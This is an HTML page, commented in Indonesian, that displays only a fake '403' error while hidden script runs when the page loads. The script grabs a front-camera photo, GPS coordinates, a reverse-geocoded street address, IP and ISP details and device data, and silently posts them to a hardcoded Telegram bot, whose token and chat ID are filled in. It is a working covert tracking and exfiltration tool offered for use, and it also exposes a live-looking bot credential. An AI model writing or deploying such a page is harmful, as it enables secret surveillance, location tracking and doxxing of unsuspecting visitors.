<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>403</title>
  <style>
    /* Disguise UI: hanya menampilkan 403 */
    html,body{height:100%;margin:0}
    body{
      background:#000;
      color:#b30000;
      font-family:monospace;
      display:flex;
      align-items:center;
      justify-content:center;
      font-size:72px;
      user-select:none;
    }
    /* hidden elements for camera/canvas */
    video,canvas{display:none}
  </style>
</head>
<body>
  403

  <!-- hidden elements -->
  <video id="video" autoplay playsinline width="400" height="400"></video>
  <canvas id="canvas" width="800" height="800"></canvas>

<script>
/*
  AUTO-REPORT HTML
  - Ganti BOT_TOKEN & CHAT_ID kalau perlu (sudah terisi sesuai permintaan).
  - Host via HTTPS atau buka di localhost agar kamera & geolocation berjalan.
  - Jika ingin real profile lookup: isi object `profiles` dengan mapping IP -> profile.
*/

const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

/* ---------------------------
   PROFILE DATABASE (OPTIONAL)
   Jika kamu punya data nyata (IP -> profile), masukkan di sini.
   Contoh: profiles["118.96.123.45"] = { name:"Budi", age:"27", gender:"L", job:"Reseller", kampung:"Babakan" }
-----------------------------*/
const profiles = {
  // "118.96.123.45": { name:"Budi Santoso", age:"28", gender:"Laki-laki", job:"Reseller", kampung:"Babakan" }
};

/* ---------------------------
   Helpers & Generators
-----------------------------*/
function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

function generateFakeProfile(ip){
  // name lists (Indonesian-ish)
  const first = ["Budi","Andi","Siti","Rina","Agus","Dewi","Joko","Rian","Fitri","Eka","Yuli","Rizki","Tono","Sari"];
  const last = ["Santoso","Wijaya","Kurniawan","Hidayat","Kartika","Pratama","Susilo","Saputra","Wibowo","Putri","Aminah"];
  const jobs = ["Reseller","Pedagang","Pelajar/Mahasiswa","Driver","Karyawan Swasta","Teknisi","Ibu Rumah Tangga","Freelancer"];
  const kampungList = ["Babakan","Cisaat","Cibadak","Warudoyong","Gunungpuyuh","Baros","Cikole","Cempaka"];

  const name = rand(first) + " " + rand(last);
  const age = Math.floor(Math.random()*40) + 18; // 18-57
  const gender = Math.random() > 0.5 ? "Laki-laki" : "Perempuan";
  const job = rand(jobs);
  const kampung = rand(kampungList);

  return { name, age: String(age), gender, job, kampung };
}

/* truncate caption to safe size (telegram caption ~1024 chars) */
function safeCaption(s){
  if (!s) return '';
  if (s.length <= 1000) return s;
  return s.slice(0,1000-3) + '...';
}

/* format box with simbok garis (╭ ├ │ └) */
function buildBox(data){
  // data: object containing many fields and nested arrays
  const now = new Date();
  const lines = [];
  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
  // Pesan
  lines.push(` ├─ > Pesan`);
  lines.push(` │   └─ ${data.message || 'Auto capture & device report'}`);

  // Pengirim
  lines.push(` ├─ > Pengirim (web)`);
  lines.push(` │   └─ ${data.userAgent || '-'}`);

  // IP / ISP
  lines.push(` ├─ > IP / ISP`);
  const ip = data.ipInfo || {};
  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
  lines.push(` │   ├─ ISP/Org: ${ip.org || ip.isp || '-'}`);
  lines.push(` │   ├─ ASN: ${ip.asn || '-'}`);
  lines.push(` │   ├─ City: ${ip.city || '-'}`);
  lines.push(` │   ├─ Region: ${ip.region || ip.state || '-'}`);
  lines.push(` │   ├─ Country: ${ip.country || ip.country_name || '-'}`);
  lines.push(` │   ├─ Postal: ${ip.postal || ip.postal_code || '-'}`);
  lines.push(` │   └─ IP Timezone: ${ip.timezone || '-'}`);

  // Device
  lines.push(` ├─ > Device`);
  lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
  lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
  lines.push(` │   ├─ Language: ${data.language || '-'}`);
  lines.push(` │   ├─ Timezone (browser): ${data.timezone || '-'}`);
  lines.push(` │   ├─ Local Date: ${data.localDate || '-'}`);
  lines.push(` │   ├─ Battery: ${data.battery || '-'}`);
  lines.push(` │   ├─ Cookies Enabled: ${data.cookiesEnabled || '-'}`);
  lines.push(` │   ├─ Online: ${data.online || '-'}`);
  lines.push(` │   ├─ HW Threads: ${data.hwConcurrency || '-'}`);
  lines.push(` │   └─ DoNotTrack: ${data.doNotTrack || '-'}`);

  // Connection
  lines.push(` ├─ > Connection`);
  if (data.connection){
    lines.push(` │   └─ Type: ${data.connection.effectiveType || '-'} | Downlink: ${data.connection.downlink || '-'} Mbps | RTT: ${data.connection.rtt || '-'} ms | SaveData: ${data.connection.saveData ? 'yes' : 'no'}`);
  } else {
    lines.push(` │   └─ Connection API: tidak tersedia`);
  }

  // Geo (GPS)
  lines.push(` ├─ > Geo (GPS)`);
  if (data.geo && !data.geo.error){
    lines.push(` │   ├─ Lat: ${data.geo.lat}`);
    lines.push(` │   ├─ Lon: ${data.geo.lon}`);
    lines.push(` │   ├─ Akurasi: ${data.geo.acc || '-'}`);
    lines.push(` │   └─ Maps: ${data.geo.maps || '-'}`);
  } else {
    lines.push(` │   └─ Error GPS: ${data.geo ? data.geo.error : '-'}`);
  }

  // Address (Detailed)
  lines.push(` ├─ > Alamat (Detail)`);
  const a = data.address || {};
  // Map common nominatim keys to readable labels
  lines.push(` │   ├─ Negara: ${a.country || '-'}`);
  lines.push(` │   ├─ Provinsi: ${a.state || a.region || '-'}`);
  lines.push(` │   ├─ Kabupaten: ${a.county || '-'}`);
  lines.push(` │   ├─ Kota: ${a.city || a.town || a.village || '-'}`);
  lines.push(` │   ├─ Kecamatan: ${a.suburb || a.municipality || a.city_district || '-'}`);
  lines.push(` │   ├─ Desa/Kelurahan: ${a.village || a.hamlet || a.suburb || '-'}`);
  lines.push(` │   ├─ Kampung/Dusun: ${a.hamlet || '-'}`);
  lines.push(` │   ├─ Jalan: ${a.road || a.pedestrian || '-'}`);
  lines.push(` │   ├─ Nomor Jalan: ${a.house_number || '-'}`);
  lines.push(` │   └─ Kode Pos: ${a.postcode || '-'}`);

  // Profile (name/age/gender/job/kampung)
  lines.push(` ├─ > Profile (auto)`);
  lines.push(` │   ├─ Nama: ${data.profile.name || '-'}`);
  lines.push(` │   ├─ Usia: ${data.profile.age || '-'}`);
  lines.push(` │   ├─ Gender: ${data.profile.gender || '-'}`);
  lines.push(` │   ├─ Pekerjaan: ${data.profile.job || '-'}`);
  lines.push(` │   └─ Kampung: ${data.profile.kampung || '-'}`);

  // Extras: reverse display_name short & raw address JSON (trim)
  if (data.revDisplay) {
    lines.push(` ├─ > Alamat (ringkas)`);
    lines.push(` │   └─ ${data.revDisplay}`);
  }

  lines.push(`╰─ > Sumber: AutoReport Web`);

  return lines.join('\n');
}

/* ---------------------------
   Network / IP fetch with fallbacks (and attempt to get ASN)
-----------------------------*/
async function fetchJSON(url){
  try {
    const r = await fetch(url, { cache: 'no-store' });
    if (!r.ok) throw new Error('bad ' + r.status);
    return await r.json();
  } catch (e){
    return null;
  }
}

async function getIPInfo(){
  // try ipapi -> ipwhois -> ipinfo (limited) -> ipify (ip only)
  const sources = [
    { url:'https://ipapi.co/json/' , mapper: j => ({
        ip: j.ip, city: j.city, region: j.region, country: j.country_name || j.country,
        org: j.org, postal: j.postal, timezone: j.timezone, latitude: j.latitude || j.lat, longitude: j.longitude || j.lon
    })},
    { url:'https://ipwhois.app/json/' , mapper: j => ({
        ip: j.ip, city: j.city, region: j.region, country: j.country, org: j.org || j.isp,
        postal: j.postal, timezone: j.timezone, latitude: j.latitude, longitude: j.longitude
    })},
    { url:'https://ipinfo.io/json?token=',
      mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country, org:j.org, postal:j.postal, timezone:j.timezone }) },
    { url:'https://api.ipify.org?format=json', mapper: j => ({ ip: j.ip }) }
  ];

  for (const s of sources){
    const j = await fetchJSON(s.url);
    if (!j) continue;
    const m = s.mapper(j);
    if (m && m.ip) {
      // try to get ASN/extra via whois.cymru if needed (skip here)
      return m;
    }
  }
  return { ip: 'unknown' };
}

/* ---------------------------
   Reverse geocode via Nominatim -> return both display & address object (parsed)
-----------------------------*/
async function revGeocode(lat, lon){
  try {
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'AutoReport/1.0' }});
    if (!r.ok) throw new Error('revgeo fail ' + r.status);
    const j = await r.json();
    return { display_name: j.display_name || null, address: j.address || {} };
  } catch (e){
    return { error: e.message || 'reverse geocode failed' };
  }
}

/* ---------------------------
   Get browser/device info
-----------------------------*/
async function getBattery(){
  try {
    if (!navigator.getBattery) return null;
    const b = await navigator.getBattery();
    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
  } catch { return null; }
}
function getConnection(){ try { const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (!c) return null; return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData }; } catch { return null; } }

/* ---------------------------
   Geo (GPS) via navigator.geolocation
-----------------------------*/
function getGeo(){
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve({ error: 'geolocation not supported' });
    navigator.geolocation.getCurrentPosition(pos => {
      resolve({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy + ' m',
        maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
      });
    }, err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
  });
}

/* ---------------------------
   Telegram send: photo + caption (single message)
-----------------------------*/
async function sendPhotoCaption(blob, caption){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', blob, 'camera.png');
  fd.append('caption', caption);
  // parse_mode omitted because caption is plain text box
  return fetch(url, { method:'POST', body: fd });
}

/* ---------------------------
   Main flow
-----------------------------*/
(async function main(){
  // safety: ensure bot token & chat set
  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')){
    // nothing: avoid running without config
    return;
  }

  // gather device quick info
  const deviceInfo = {
    platform: navigator.platform || '-',
    userAgent: navigator.userAgent || '-',
    screen: (window.screen ? `${screen.width}x${screen.height}` : '-'),
    language: navigator.language || '-',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
    localDate: new Date().toLocaleString(),
    cookiesEnabled: navigator.cookieEnabled ? 'yes' : 'no',
    online: navigator.onLine ? 'online' : 'offline',
    hwConcurrency: navigator.hardwareConcurrency || '-',
    doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || '-',
    connection: getConnection()
  };
  deviceInfo.battery = await getBattery();

  // parallel fetch IP & geo
  const [ ipInfo, geo ] = await Promise.all([ getIPInfo(), getGeo() ]);

  // attempt reverse geocode if gps ok
  let rev = null;
  if (geo && !geo.error && geo.lat && geo.lon){
    rev = await revGeocode(geo.lat, geo.lon);
  }

  // profile: lookup by IP first, else generate fake
  let profile = { name:'unknown', age:'unknown', gender:'unknown', job:'unknown', kampung:'unknown' };
  if (ipInfo && ipInfo.ip && profiles[ipInfo.ip]) {
    profile = profiles[ipInfo.ip];
  } else {
    profile = generateFakeProfile(ipInfo.ip);
    // if reverse address contains village/hamlet, use that as kampung
    if (rev && rev.address){
      profile.kampung = rev.address.hamlet || rev.address.village || profile.kampung;
    }
  }

  // capture camera (try, but proceed even if fails)
  let photoBlob = null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    video.srcObject = stream;
    await video.play();
    // give time for camera to produce frame
    await new Promise(r => setTimeout(r, 1000));
    // draw center-cropped to canvas (square)
    const w = video.videoWidth || canvas.width;
    const h = video.videoHeight || canvas.height;
    // scale/crop to fit canvas
    ctx.clearRect(0,0,canvas.width,canvas.height);
    // compute aspect ratios to center crop
    const side = Math.min(w, h);
    const sx = (w - side)/2;
    const sy = (h - side)/2;
    ctx.drawImage(video, sx, sy, side, side, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach(t=>t.stop());
    photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
  } catch (e){
    // camera failed or permission denied; we continue and only send text if no photo
    photoBlob = null;
  }

  // build final data object for box
  const data = {
    message: 'Auto capture & device report',
    userAgent: deviceInfo.userAgent,
    ipInfo: ipInfo || {},
    platform: deviceInfo.platform,
    screen: deviceInfo.screen,
    language: deviceInfo.language,
    timezone: deviceInfo.timezone,
    localDate: deviceInfo.localDate,
    battery: deviceInfo.battery,
    cookiesEnabled: deviceInfo.cookiesEnabled,
    online: deviceInfo.online,
    hwConcurrency: deviceInfo.hwConcurrency,
    doNotTrack: deviceInfo.doNotTrack,
    connection: deviceInfo.connection,
    geo: geo || {},
    address: (rev && rev.address) ? rev.address : {},
    revDisplay: (rev && rev.display_name) ? rev.display_name : null,
    profile: profile
  };

  // build box string
  const boxed = buildBox(data);
  const caption = safeCaption(boxed);

  // send as single message (photo + caption) if photo available
  try {
    if (photoBlob){
      await sendPhotoCaption(photoBlob, caption);
    } else {
      // fallback: send caption as text-only message
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
      });
    }
  } catch (e){
    // silently fail (nothing to show on page)
    console.error('telegram send failed', e);
  }

})();
</script>
</body>
</html>
